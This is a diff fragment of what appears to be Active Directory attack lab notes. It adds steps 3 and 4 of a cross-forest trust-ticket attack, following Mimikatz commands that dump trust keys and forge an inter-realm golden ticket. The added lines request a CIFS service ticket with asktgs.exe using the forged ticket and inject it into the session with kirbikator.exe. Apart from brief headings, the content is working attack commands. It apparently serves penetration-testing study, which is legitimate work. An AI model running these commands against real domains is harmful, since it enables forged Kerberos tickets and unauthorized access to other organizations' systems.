@@ -623,3 +623,14 @@ Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc.corp.c
 # Create the inter-realm TGT
 Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:<domain> /sid:S-1-5-21-1874506631-3219952063-538504511 /rc4:<hash> /service:krbtgt /target:eurocorp.local /ticket:C:\test\kekeo_old\trust_forest_tkt.kirbi"'
 ```
+**3. Get a TGS for a service (CIFS below) in the target domain by using the
+forged trust ticket:**
+```powershell
+# Get a TGS for a service
+.\asktgs.exe C:\test\trust_forest_tkt.kirbi CIFS/eurocorp-dc.corporate.local
+```
+**4. Present the TGS to the service (CIFS) in the target forest:**
+```powershell
+# Present the TGS
+.\kirbikator.exe lsa .\CIFS.eurocorp-dc.corporate.local.kirbi
+```
